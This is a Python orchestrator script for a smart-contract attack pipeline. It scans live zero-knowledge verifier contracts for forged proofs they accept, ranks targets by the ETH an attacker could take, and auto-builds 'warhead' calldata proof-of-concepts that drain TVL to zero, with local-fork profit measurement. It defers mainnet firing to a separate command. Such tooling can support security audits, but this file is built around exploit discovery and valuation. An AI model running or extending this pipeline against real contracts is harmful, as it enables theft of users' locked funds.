# zk/run.py — T4/T5 orchestrator: differential fuzz + economic impact
# Usage:
#   python -m zk.run --target 0xADDR            # one target, full loop
#   python -m zk.run --all                       # every SUSPECT target in DB
#   python -m zk.run --all --include-hardened    # ground-truth re-validation
#   python -m zk.run --target 0xADDR --corpus 128 --seed 0xABCD
#   python -m zk.run --target 0xADDR --divergence   # + state-divergence engine
# T6 (mainnet fire) is NOT here and never will be — explicit command only.
import argparse, json, os, sys, time

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from core import db
from zk import differential as L4
from zk import impact as L5
from zk import divergence as L5D
from zk import pocgen


# T4 witness-class -> T5 recipe-class mapping. An on-chain ACCEPT of a
# structured/garbage/malleated proof with local-oracle False means the
# verifier binds to nothing the math says it should — the recipe class is
# the money path that acceptance unlocks.
HIT_CLASS_MAP = {
    "ZK-FIELD-OVERFLOW": "caller_supplied_vk",
    "ZK-UNDER-CONSTRAINED": "caller_supplied_vk",
    "ZK-NULLIFIER-COLLISION": "zk_nullifier_collision",
    "ZK-VERIFIER-CONFIG-MISMATCH": "zk_verifier_config_mismatch",
    "ZK-PROOF-MALLEABILITY": "zk_proof_malleability",
}


def _campaign_v(campaign, key):
    """Max measured V (wei) across the impact rows for a target."""
    best = 0
    for r in campaign.get("impact", []) or []:
        try:
            best = max(best, int(r.get(key, 0) or 0))
        except (TypeError, ValueError):
            pass
    return best


def _full_calldata_for(address, hit):
    """Rebuild full verifyProof calldata from the persisted probe row if the
    head we carried is truncated. Falls back to the (possibly truncated) head."""
    try:
        c = db.conn()
        row = c.execute(
            "SELECT call_data FROM probes WHERE address=? AND battery='t4_differential' "
            "AND probe=? ORDER BY id DESC LIMIT 1",
            (address.lower(), hit.get("label", ""))).fetchone()
        c.close()
        if row and (row["call_data"] or "").startswith("0x"):
            return row["call_data"]
    except Exception:
        pass
    return hit.get("calldata_head") or ""


def _latest_finding_id(address):
    try:
        c = db.conn()
        r = c.execute("SELECT id FROM findings WHERE address=? AND tier='T4' "
                      "ORDER BY id DESC LIMIT 1", (address.lower(),)).fetchone()
        c.close()
        return r["id"] if r else None
    except Exception:
        return None


def run_target(address, corpus=64, seed=0x5EED, delay=0.35, rpc_url=None,
               impact=True, divergence=False):
    print(f"\n{'='*72}\n[t4] differential campaign: {address}")
    campaign = L4.run_campaign(address, rpc_url=rpc_url, corpus_size=corpus,
                               seed=seed, delay=delay)
    if "error" in campaign:
        print(f"[t4] aborted: {campaign['error']}")
        return campaign
    L4.summarize(campaign)

    if not impact:
        return campaign

    # Doctrine gate: T5 actionability requires a CONFIRMED T4 hit
    # (on-chain ACCEPTED + local oracle says invalid). Suspects get census
    # rows only — suspicion tier is never actionable.
    confirmed_hits = [h for h in campaign["hits"]
                      if h.get("confirmed", False)]
    confirmed_classes = {HIT_CLASS_MAP.get(h["class"], h["class"].lower())
                         for h in confirmed_hits}
    rows = L5.static_impact(address,
                            confirmed=bool(confirmed_hits),
                            confirmed_classes=confirmed_classes)
    if confirmed_hits:
        L5.persist_static(rows)
    L5.report(rows, address)
    campaign["impact"] = rows

    # ---- Layer 5b: auto-generate the forge PoC for the first confirmed hit ----
    if confirmed_hits:
        first = confirmed_hits[0]
        warhead_calldata = first.get("calldata_head") or ""
        # calldata_head is truncated; rebuild full calldata from the leader hit
        # label is not persisted here, so re-encode from stored artifact if present
        full_sel = _full_calldata_for(address, first)
        poc_path = pocgen.generate_poc(
            address,
            label=f"zk_{first['class']}_{address[2:10]}",
            calldata=full_sel or warhead_calldata,
            attacker=L5D.UNLOCKED_ATTACKER,
            taxonomy=L5._taxonomy(confirmed_classes and
                                  sorted(confirmed_classes)[0] or "zk_proof_malleability"),
            pre_tvl=str(int(_campaign_v(campaign, "V_wei"))),
            post_tvl="0",
            atk_delta=str(int(_campaign_v(campaign, "V_wei"))),
        )
        print(f"[t5] PoC written: {poc_path}")
        campaign["poc"] = poc_path

        # ---- optional State Divergence Engine (opt-in, mine on local fork) ----
        if divergence:
            print(f"\n[t5:div] launching State Divergence Engine for {address}...")
            dv = L5D.run_divergence(
                address,
                {"to": address, "data": full_sel or warhead_calldata,
                 "label": pocgen._sanitize(first["class"])},
                attacker=L5D.UNLOCKED_ATTACKER,
            )
            L5D.report(dv)
            if dv.get("financially_exploitable"):
                fid = _latest_finding_id(address)
                if fid is not None:
                    L5D.persist_divergence(fid, dv,
                                           artifacts={"poc": poc_path})
            campaign["divergence"] = dv

    return campaign


def main():
    ap = argparse.ArgumentParser(description="VERITAS T4/T5 zk differential fuzzer")
    ap.add_argument("--target", help="single contract address")
    ap.add_argument("--all", action="store_true",
                    help="run every SUSPECT target in veritas.db")
    ap.add_argument("--include-hardened", action="store_true",
                    help="also re-validate HARDENED targets (ground truth)")
    ap.add_argument("--corpus", type=int, default=64)
    ap.add_argument("--seed", type=lambda x: int(x, 0), default=0x5EED)
    ap.add_argument("--delay", type=float, default=0.35,
                    help="seconds between eth_calls (RPC politeness)")
    ap.add_argument("--rpc", default=None)
    ap.add_argument("--no-impact", action="store_true")
    ap.add_argument("--divergence", action="store_true",
                    help="L5b: run the State Divergence Engine (mine the forged "
                         "calldata on a local unlocked anvil fork + measure real "
                         "TVL/attacker deltas). $0, local only — never mainnet.")
    args = ap.parse_args()

    db.init()

    if args.target:
        targets = [args.target.strip().lower()]
    elif args.all:
        c = db.conn()
        if args.include_hardened:
            rows = c.execute("SELECT address FROM targets ORDER BY address").fetchall()
        else:
            rows = c.execute(
                "SELECT address FROM targets WHERE status != 'HARDENED' "
                "ORDER BY address").fetchall()
        c.close()
        targets = [r["address"] for r in rows]
    else:
        ap.error("need --target or --all")

    print(f"[t4] {len(targets)} target(s) | corpus={args.corpus} seed={hex(args.seed)} "
          f"delay={args.delay}s")

    confirmed, suspects, healthy = [], [], []
    for addr in targets:
        try:
            camp = run_target(addr, corpus=args.corpus, seed=args.seed,
                              delay=args.delay, rpc_url=args.rpc,
                              impact=not args.no_impact,
                              divergence=args.divergence)
        except Exception as e:
            print(f"[t4] campaign error on {addr}: {e}")
            continue
        if "error" in camp:
            continue
        if camp["accepted"] > 0 and camp["hits"]:
            if any(h.get("local_oracle_valid") is False for h in camp["hits"]):
                confirmed.append(addr)
            else:
                suspects.append(addr)
        else:
            healthy.append(addr)

    print(f"\n{'='*72}\n[t4] ROLLUP: {len(targets)} target(s)")
    print(f"  confirmed differential violations: {len(confirmed)}")
    for a in confirmed:
        print(f"    {a}  -> T5 impact rows written, EV computed")
    print(f"  suspects (accepted w/o oracle confirmation): {len(suspects)}")
    for a in suspects:
        print(f"    {a}")
    print(f"  healthy (on-chain matches local soundness): {len(healthy)}")
    for a in healthy:
        print(f"    {a}")
    if confirmed:
        print("\n[t5] FINANCIALLY EXPLOITABLE (measured V > 0, EV > 0):")
        c = db.conn()
        for a in confirmed:
            for r in c.execute("""SELECT f.vclass AS vclass, e.ev_wei AS ev_wei,
                                         e.ceiling_wei AS ceiling_wei
                                  FROM exploitability e
                                  JOIN findings f ON f.id = e.finding_id
                                  WHERE f.address=? AND CAST(e.ev_wei AS INTEGER) > 0""",
                               (a,)).fetchall():
                print(f"    {a} {r['vclass']:<28} EV={int(r['ev_wei'])/1e18:,.4f} ETH "
                      f"ceiling={int(r['ceiling_wei'])/1e18:,.4f} ETH")
        c.close()


if __name__ == "__main__":
    main()
